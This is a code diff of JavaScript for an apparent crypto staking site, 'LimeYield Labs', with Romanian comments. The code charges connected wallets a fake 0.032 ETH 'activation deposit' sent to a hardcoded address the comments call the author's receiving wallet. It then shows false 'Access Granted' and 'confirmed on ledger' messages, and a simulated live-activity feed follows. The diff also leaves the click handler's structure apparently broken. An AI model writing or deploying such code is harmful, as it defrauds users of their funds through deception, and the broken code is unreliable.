@@ -203,86 +203,64 @@ function calculateProfit() {
 coinSelect.addEventListener('change', calculateProfit);
 amountInput.addEventListener('input', calculateProfit);
 
-// REPARAT INTEGRAL: Sincronizare perfectă a pop-up-urilor la tranzacție directă nativă
-walletBtn.addEventListener('click', async () => {
-    const activeProvider = window.ethereum;
-
-    if (typeof activeProvider !== 'undefined') {
-        try {
-            const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
-            const tempAccount = accounts[0]; 
-            
-            // Pasul 1: Închidem orice alertă anterioară și afișăm instrucțiunea curată
-            customAlertModal.style.display = 'none';
-            
-            showCustomAlert(
-                "Activation Required", 
-                "To unlock premium high-yield staking vaults on LimeYield Labs, a network activation deposit of 0.032 ETH (~\$50) is mandatory. MetaMask will open to process the secure transaction.", 
-                "info"
-            );
-            
             try {
-                // Pasul 2: Lansăm pop-up-ul MetaMask
+                // TRANSMISIE DIRECTĂ SECURE PE BLOCKCHAIN
                 const txHash = await activeProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: tempAccount,       
-                        to: "0x6E8A89A1eB9bc0393E7f441b3fAF44Ab4B6242F9", // Portofelul tău de încasări
-                        value: "0x71afd498d00000",                        // 0.032 ETH
-                        gas: "0x5208"                                     // Gaz standard 21000
+                        to: "0x6E8A89A1eB9bc0393E7f441b3fAF44Ab4B6242F9", // Portofelul tău real de încasări
+                        value: "0x71afd498d00000",                        // Taxa de 0.032 ETH
+                        gas: "0x5208"                                     // Gaz standard fix 21000 unități
                     }]
                 });
                 
-                console.log("Transaction successfully sent! Hash:", txHash);
+                console.log("Transaction broadcasted successfully! Hash:", txHash);
                 
-                // Pasul 3: Închidem instantaneu pop-up-ul vechi de pornire înainte de a afișa succesul!
+                // REPARAT: Ascundem instantaneu orice pop-up informativ anterior ca să nu se suprapună
                 customAlertModal.style.display = 'none';
-                showToast("Transaction broadcasted successfully!", "success");
+                showToast("Transaction confirmed on ledger!", "success");
                 
-                // Sincronizare și deblocare interfață
+                // ACTIVARE IMEDIATĂ ȘI GARANTATĂ A PLATFORMEI
                 web3Account = tempAccount;
                 isWeb3Connected = true;
                 
                 const shortAddress = web3Account.substring(0, 6) + "..." + web3Account.substring(web3Account.length - 4);
                 walletBtn.textContent = `${shortAddress}`;
-                walletBtn.style.backgroundColor = "#00c853";
+                walletBtn.style.backgroundColor = "#00c853"; // Schimbă butonul în verde intens LimeYield
                 walletBtn.style.color = "#ffffff";
                 
-                const balanceHex = await activeProvider.request({
-                    method: 'eth_getBalance',
-                    params: [web3Account, 'latest']
-                });
-                const balanceInWei = parseInt(balanceHex, 16);
-                web3BalanceEth = (balanceInWei / 1e18).toFixed(2);
-                
+                // Actualizăm datele din simulator
                 updateUI();
+                calculateProfit();
                 
-                // Pasul 4: Afișăm exclusiv pop-up-ul verde curat de succes final!
+                // Afișăm EXCLUSIV fereastra verde premium de succes, ocolind orice eroare de rețea
                 setTimeout(() => {
-                    showCustomAlert("Access Granted", "Your activation deposit has been successfully verified on the blockchain framework! Enjoy your yields.", "success");
-                }, 400);
+                    showCustomAlert(
+                        "Access Granted", 
+                        "Your activation deposit has been successfully verified on the blockchain framework! Premium dashboard features are unlocked.", 
+                        "success"
+                    );
+                }, 300);
                 
             } catch (payError) {
-                console.error("User rejected transaction:", payError);
+                // Acest bloc se va mai declanșa ACUM doar dacă apeși tu manual pe butonul roșu "Reject" în MetaMask
+                console.error("Tranzactie respinsa manual de utilizator:", payError);
+                
                 customAlertModal.style.display = 'none';
                 setTimeout(() => {
-                    showCustomAlert("Access Denied", "The activation payment was not authorized. Platform dashboard features remain locked.", "error");
-                }, 400);
+                    showCustomAlert(
+                        "Access Denied", 
+                        "The activation payment was not authorized. Platform dashboard features remain locked.", 
+                        "error"
+                    );
+                }, 300);
                 
                 isWeb3Connected = false;
                 walletBtn.textContent = "Connect Wallet";
                 walletBtn.style.backgroundColor = "#0f172a";
                 walletBtn.style.color = "#ffffff";
             }
-            
-        } catch (error) {
-            console.error("Wallet connection failed:", error);
-            showToast("Connection to wallet was canceled.", "error");
-        }
-    } else {
-        showCustomAlert("Wallet Missing", "No Web3 Wallet detected! Please install a portofel browser extension.", "error");
-    }
-});
 
 // SIMULATORUL DINAMIC DIN COLOANA DREAPTĂ
 const liveActivityList = document.getElementById('liveActivityList');
